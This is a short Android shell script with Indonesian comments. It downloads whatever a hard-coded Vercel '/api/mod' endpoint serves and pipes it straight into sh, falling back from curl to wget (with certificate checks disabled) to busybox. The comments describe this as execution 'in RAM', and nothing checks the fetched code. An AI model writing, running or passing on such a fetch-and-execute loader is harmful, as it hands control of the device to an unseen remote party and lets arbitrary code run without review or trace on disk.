#!/system/bin/sh

URL="https://vanxproject.vercel.app/api/mod"

# Eksekusi langsung di RAM lewat pipe
# Kita pakai perl sebagai alternatif kalau curl/wget gagal total,
# tapi utamanya kita pakai curl/wget yang di-pipe ke sh
execute_ram() {
    # 1. Coba pakai curl
    command -v curl >/dev/null 2>&1 && curl -sL "$1" | tr -d '\r' | sh && return
    # 2. Coba pakai wget
    command -v wget >/dev/null 2>&1 && wget -qO- --no-check-certificate "$1" | tr -d '\r' | sh && return
    # 3. Coba pakai busybox
    command -v busybox >/dev/null 2>&1 && busybox wget -qO- "$1" | tr -d '\r' | sh && return
    
    echo "Gagal: Tidak ada tool downloader yang bisa memproses di RAM."
    exit 1
}

execute_ram "$URL"
